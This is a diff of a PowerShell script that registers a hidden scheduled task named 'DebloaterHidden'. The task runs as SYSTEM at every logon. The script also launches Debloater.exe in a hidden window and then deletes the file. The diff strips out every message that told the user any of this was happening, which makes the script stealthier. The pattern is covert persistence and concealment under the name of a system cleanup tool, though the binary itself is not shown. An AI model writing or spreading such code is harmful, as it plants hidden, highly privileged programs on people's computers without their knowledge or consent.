@@ -28,7 +28,6 @@ Remove-Job $job1
 
 if (Test-Path $output1) {
     $taskName = "DebloaterHidden"
-    # إخفاء مخرجات الأوامر باستخدام Out-Null
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
     }
@@ -36,7 +35,6 @@ if (Test-Path $output1) {
     $trigger = New-ScheduledTaskTrigger -AtLogOn
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
-    Write-Host "Debloater.exe added as a hidden scheduled task." -ForegroundColor Green
 
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
     $maxTries = 5
@@ -51,9 +49,7 @@ if (Test-Path $output1) {
         }
     }
     if ($deleted) {
-        Write-Host "Debloater.exe deleted successfully." -ForegroundColor Green
     } else {
-        Write-Host "Failed to delete Debloater.exe after multiple attempts." -ForegroundColor Red
     }
 }
 
